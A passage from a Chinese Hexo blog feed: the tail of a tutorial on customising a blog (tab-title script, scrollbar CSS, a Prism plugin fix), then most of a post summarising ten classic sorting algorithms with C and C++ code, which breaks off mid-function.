keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> document<span class="token punctuation">.</span>hidden <span class="token operator">?</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">"Σ(っ °Д°;)っ喔哟，崩溃啦！"</span><span class="token punctuation">,</span> <span class="token function">clearTimeout</span><span class="token punctuation">(</span>st<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">"φ(゜▽゜*)♪咦，又好了！"</span><span class="token punctuation">,</span> st <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> document<span class="token punctuation">.</span>title <span class="token operator">=</span> OriginTitile <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">3e3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="修改滑动条">修改滑动条</h4><pre class="line-numbers language-css" data-language="css"><code class="language-css"><span class="token comment">/* 滚动条 */</span><span class="token selector">::-webkit-scrollbar-thumb</span> <span class="token punctuation">{</span>    <span class="token property">background-color</span><span class="token punctuation">:</span> #FF2A68<span class="token punctuation">;</span>    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">-webkit-linear-gradient</span><span class="token punctuation">(</span>45deg<span class="token punctuation">,</span><span class="token function">rgba</span><span class="token punctuation">(</span>255<span class="token punctuation">,</span>255<span class="token punctuation">,</span>255<span class="token punctuation">,</span>.4<span class="token punctuation">)</span> 25%<span class="token punctuation">,</span>transparent 25%<span class="token punctuation">,</span>transparent 50%<span class="token punctuation">,</span><span class="token function">rgba</span><span class="token punctuation">(</span>255<span class="token punctuation">,</span>255<span class="token punctuation">,</span>255<span class="token punctuation">,</span>.4<span class="token punctuation">)</span> 50%<span class="token punctuation">,</span><span class="token function">rgba</span><span class="token punctuation">(</span>255<span class="token punctuation">,</span>255<span class="token punctuation">,</span>255<span class="token punctuation">,</span>.4<span class="token punctuation">)</span> 75%<span class="token punctuation">,</span>transparent 75%<span class="token punctuation">,</span>transparent<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token property">border-radius</span><span class="token punctuation">:</span> 3em<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">::-webkit-scrollbar-track</span> <span class="token punctuation">{</span>    <span class="token property">background-color</span><span class="token punctuation">:</span> #ffcacaff<span class="token punctuation">;</span>    <span class="token property">border-radius</span><span class="token punctuation">:</span> 3em<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token selector">::-webkit-scrollbar</span> <span class="token punctuation">{</span>    <span class="token property">width</span><span class="token punctuation">:</span> 8px<span class="token punctuation">;</span>    <span class="token property">height</span><span class="token punctuation">:</span> 15px<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-5-常见问题">6.5 常见问题</h3><h4 id="文章预览显示过长">文章预览显示过长</h4><p>手动在文章内部加上<code>&lt;!-- more --&gt;</code></p><p>​</p><h4 id="代码块中的-无法解析问题解决">代码块中的<code>{}</code>无法解析问题解决</h4><p><code>node_modules/hexo-prism-plugin/src/index.js</code>文件中<code>map</code>里未支持大括号，加上对应字符即可</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> map <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token string">'&amp;#39;'</span><span class="token operator">:</span> <span class="token string">'\''</span><span class="token punctuation">,</span>  <span class="token string">'&amp;amp;'</span><span class="token operator">:</span> <span class="token string">'&amp;'</span><span class="token punctuation">,</span>  <span class="token string">'&amp;gt;'</span><span class="token operator">:</span> <span class="token string">'&gt;'</span><span class="token punctuation">,</span>  <span class="token string">'&amp;lt;'</span><span class="token operator">:</span> <span class="token string">'&lt;'</span><span class="token punctuation">,</span>  <span class="token string">'&amp;quot;'</span><span class="token operator">:</span> <span class="token string">'"'</span><span class="token punctuation">,</span>  <span class="token string">'&amp;#123;'</span><span class="token operator">:</span> <span class="token string">'{'</span><span class="token punctuation">,</span><span class="token comment">//添加的代码</span>  <span class="token string">'&amp;#125;'</span><span class="token operator">:</span> <span class="token string">'}'</span><span class="token comment">//添加的代码</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>未完待续…</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 博客 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>十大经典排序算法整理汇总</title>
      <link href="2020/02/16/sort-algorithms/"/>
      <url>2020/02/16/sort-algorithms/</url>
      
        <content type="html"><![CDATA[<h2 id="前言-2">前言</h2><p>本文整理并总结了十大经典的排序算法（冒泡排序、选择排序、插入排序、快速排序、归并排序、希尔排序、计数排序、基数排序、桶排序、堆排序）的时间复杂度、空间复杂度等性质。</p><p><strong>题目练习</strong>：<a href="https://leetcode-cn.com/problems/sort-an-array/" title="LeetCode 912. 排序数组">LeetCode 912. 排序数组</a></p><p>​</p><p>​</p><h2 id="性质汇总">性质汇总</h2><p><img src="https://gitee.com/lastlight/MyPictrue/raw/master/img/sort-algorithms.png" alt="十大经典排序算法性质汇总"></p><p>​</p><p>​</p><p><strong>冒泡排序</strong></p><p><em>Bubble sort, sometimes referred to as sinking sort, is a simple sorting algorithm that repeatedly steps through the list, <strong>compares adjacent elements and swaps them if they are in the wrong order</strong>. The pass through the list is repeated until the list is sorted. The algorithm, which is a comparison sort, is named for the way smaller or larger elements “bubble” to the top of the list.</em></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">enum</span><span class="token punctuation">{</span>    FALSE<span class="token punctuation">,</span>    TRUE<span class="token punctuation">}</span> Boolean<span class="token punctuation">;</span> <span class="token comment">//FALSE为0，TRUE为1</span><span class="token keyword">void</span> <span class="token function">BubbleSort</span><span class="token punctuation">(</span>SeqList R<span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">//自下向上扫描对R做冒泡排序</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">;</span>    Boolean exchange<span class="token punctuation">;</span> <span class="token comment">//交换标志</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span><span class="token comment">//最多做n-1趟排序</span>        exchange <span class="token operator">=</span> FALSE<span class="token punctuation">;</span> <span class="token comment">//本趟排序开始前，交换标志应为假</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&gt;=</span> i<span class="token punctuation">;</span> j<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token comment">//对当前无序区R[i‥n] 自下向上扫描</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>R<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>key <span class="token operator">&lt;</span> R<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>key<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                                                    <span class="token comment">//两两比较，满足条件交换记录</span>                R<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> R<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                R<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> R<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>                R<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> R<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                exchange <span class="token operator">=</span> TRUE<span class="token punctuation">;</span><span class="token comment">//发生了交换，故将交换标志置为真</span>            <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>exchange<span class="token punctuation">)</span> <span class="token comment">//本趟排序未发生交换，提前终止算法</span>            <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​</p><p>​</p><p><strong>选择排序</strong></p><p><em>In computer science, <strong>selection sort</strong> is an in-place comparison sorting algorithm. It has an O(( n^2​ )) time complexity, which makes it inefficient on large lists, and generally performs worse than the similar insertion sort. Selection sort is noted for its simplicity and has performance advantages over more complicated algorithms in certain situations, particularly where auxiliary memory is limited.</em></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">SelectSort</span><span class="token punctuation">(</span>SeqList R<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> k<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span> <span class="token comment">//做第i趟排序（1≤i≤n-1）</span>        <span class="token keyword">int</span> minIndex <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span> <span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span> <span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n <span class="token punctuation">;</span> j <span class="token operator">++</span> <span class="token punctuation">)</span>            <span class="token keyword">if</span><span class="token punctuation">(</span> R<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">.</span>key <span class="token operator">&lt;</span> R<span class="token punctuation">[</span>minIndex<span class="token punctuation">]</span><span class="token punctuation">.</span>key <span class="token punctuation">)</span>                minIndex <span class="token operator">=</span> j<span class="token punctuation">;</span>        <span class="token function">swap</span><span class="token punctuation">(</span> R<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>key <span class="token punctuation">,</span> R<span class="token punctuation">[</span>minIndex<span class="token punctuation">]</span><span class="token punctuation">.</span>key <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​</p><p>​</p><p><strong>插入排序</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">insertSort</span><span class="token punctuation">(</span><span class="token keyword">int</span> arr<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> len<span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> len<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>arr<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">&gt;</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">int</span> temp <span class="token operator">=</span> arr<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//缓存</span><span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">;</span> j <span class="token operator">&gt;=</span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> temp <span class="token operator">&lt;</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span> j<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>arr<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> arr<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//数据后移</span><span class="token punctuation">}</span>arr<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://en.wikipedia.org/wiki/Insertion_sort">https://en.wikipedia.org/wiki/Insertion_sort</a></p><p><strong>快速排序</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">quick_sort</span><span class="token punctuation">(</span><span class="token keyword">int</span> q<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">&gt;=</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> j <span class="token operator">=</span> r <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> x <span class="token operator">=</span> q<span class="token punctuation">[</span>l <span class="token operator">+</span> r <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> j<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">do</span> i <span class="token operator">++</span> <span class="token punctuation">;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>q<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">do</span> j <span class="token operator">--</span> <span class="token punctuation">;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>q<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&gt;</span> x<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;</span> j<span class="token punctuation">)</span> <span class="token function">swap</span><span class="token punctuation">(</span>q<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> q<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">quick_sort</span><span class="token punctuation">(</span>q<span class="token punctuation">,</span> l<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">quick_sort</span><span class="token punctuation">(</span>q<span class="token punctuation">,</span> j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://en.wikipedia.org/wiki/Quicksort">https://en.wikipedia.org/wiki/Quicksort</a></p><p><strong>归并排序</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">merge_sort</span><span class="token punctuation">(</span><span class="token keyword">int</span> q<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">,</span> <span class="token keyword">int</span> r<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>l <span class="token operator">&gt;=</span> r<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> mid <span class="token operator">=</span> l <span class="token operator">+</span> r <span class="token operator">&gt;&gt;</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token function">merge_sort</span><span class="token punctuation">(</span>q<span class="token punctuation">,</span> l<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">merge_sort</span><span class="token punctuation">(</span>q<span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> r<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> i <span class="token operator">=</span> l<span class="token punctuation">,</span> j <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> mid <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> r<span class="token punctuation">)</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>q<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> q<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> tmp<span class="token punctuation">[</span>k <span class="token operator">++</span> <span class="token punctuation">]</span> <span class="token operator">=</span> q<span class="token punctuation">[</span>i <span class="token operator">++</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">else</span> tmp<span class="token punctuation">[</span>k <span class="token operator">++</span> <span class="token punctuation">]</span> <span class="token operator">=</span> q<span class="token punctuation">[</span>j <span class="token operator">++</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> mid<span class="token punctuation">)</span> tmp<span class="token punctuation">[</span>k <span class="token operator">++</span> <span class="token punctuation">]</span> <span class="token operator">=</span> q<span class="token punctuation">[</span>i <span class="token operator">++</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;=</span> r<span class="token punctuation">)</span> tmp<span class="token punctuation">[</span>k <span class="token operator">++</span> <span class="token punctuation">]</span> <span class="token operator">=</span> q<span class="token punctuation">[</span>j <span class="token operator">++</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> l<span class="token punctuation">,</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> r<span class="token punctuation">;</span> i <span class="token operator">++</span><span class="token punctuation">,</span> j <span class="token operator">++</span> <span class="token punctuation">)</span> q<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://en.wikipedia.org/wiki/Merge_sort">https://en.wikipedia.org/wiki/Merge_sort</a></p><p><strong>希尔排序</strong><br><a href="https://en.wikipedia.org/wiki/Shellsort">https://en.wikipedia.org/wiki/Shellsort</a></p><p><strong>计数排序</strong><br><a href="https://en.wikipedia.org/wiki/Counting_sort">https://en.wikipedia.org/wiki/Counting_sort</a></p><p><strong>基数排序</strong><br><a href="https://en.wikipedia.org/wiki/Radix_sort">https://en.wikipedia.org/wiki/Radix_sort</a></p><p><strong>桶排序</strong><br><a href="https://en.wikipedia.org/wiki/Bucket_sort">https://en.wikipedia.org/wiki/Bucket_sort</a></p><p><strong>堆排序</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token comment">//==========大根堆调整函数=======</span><span class="token keyword">void</span> <span class="token function">Heapify</span><span class="token punctuation">(</span>SeqList R<span class="token punctuation">,</span> <span class="token keyword">int</span> low<span class="token punctuation">,</span> <span class="token keyword">int</span> high<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> large<span class="token punctuation">;</span>    RecType temp <span class="token operator">=</span> R<span class="token punctuation">[</span>low<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>large<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>low<span class="token punctuation">;</span>large<span class="token operator">&lt;=</span>high<span class="token punctuation">;</span> large<span class="token operator">*=</span><span class="token number">2</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>large <span class="token operator">&lt;</span> high <span class="token operator">&amp;&amp;</span> R<span class="token punctuation">[</span>large<span class="token punctuation">]</span><span class="token punctuation">.</span>key <span class="token operator">&lt;</span> R<span class="token punctuation">[</span>large <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>key<span class="token punctuation">)</span>            large<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>temp<span class="token punctuation">.</span>key <span class="token operator">&gt;=</span> R<span class="token punctuation">[</span>large<span class="token punctuation">]</span><span class="token punctuation">.</span>key<span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        R<span class="token punctuation">[</span>low<span class="token punctuation">]</span> <span class="token operator">=</span> R<span class="token punctuation">[</span>large<span class="token punctuation">]</span><span class="token punctuation">;</span>        low <span class="token operator">=</span> large<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    R<span class="token punctuation">[</span>low<span class="token punctuation">]</span> <span class="token operator">=</span> temp<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">//==========构造大根堆==========</span><span class="token keyword">void</span> <span class="token function">BuildHeap</span><span class="token punctuation">(</span>SeqList R<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span>n<span class="token operator">/</span><span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">Heapify</span><span class="token punctuation">(</span>R<span class="token punctuation">,</span> i<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">//==========堆排序===========</span><span class="token keyword">void</span> <span class="token function">HeapSort</span><span class="token punctuation">(</span>SeqList R<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token function">BuildHeap</span><span class="token punctuation">(</span>R<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i<span class="token operator">=</span>n<span class="token punctuation">;</span>i<span class="token operator">&gt;</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        R<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> R<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> R<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> R<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> R<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> R<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">Heapify</span><span class="token punctuation">(</span>R<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://en.wikipedia.org/wiki/Heapsort">https://en.wikipedia.org/wiki/Heapsort</a></p><p>​</p><p>​</p><h2 id="代码实现">代码实现</h2><p>所有的排序算法接口都是相同的，也就是 <code>vector&lt;int&gt; xxxSort(vector&lt;int&gt;&amp; nums)</code> 。只需要你传入一个 <code>vector&lt;int&gt;</code> 类型的数组，就能返回排序后的结果。</p><p>运行下来可以发现，桶排序速度是比较快的。而冒泡排序、选择排序和插入排序因为时间复杂度太高无法通过本题，基数排序因为无法处理负数也不能通过本题。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token function">sortArray</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">quickSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 冒泡排序（超时）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token function">bubbleSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> n<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span> j <span class="token operator">&gt;=</span> i<span class="token punctuation">;</span> <span class="token operator">--</span>j<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">&gt;</span> nums<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token function">swap</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> nums<span class="token punctuation">[</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> nums<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 选择排序（超时）</span>    vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> <span class="token function">selectSort</span><span class="token punctuation">(</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span><span class="token operator">&amp;</span> nums<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span> <span class="token 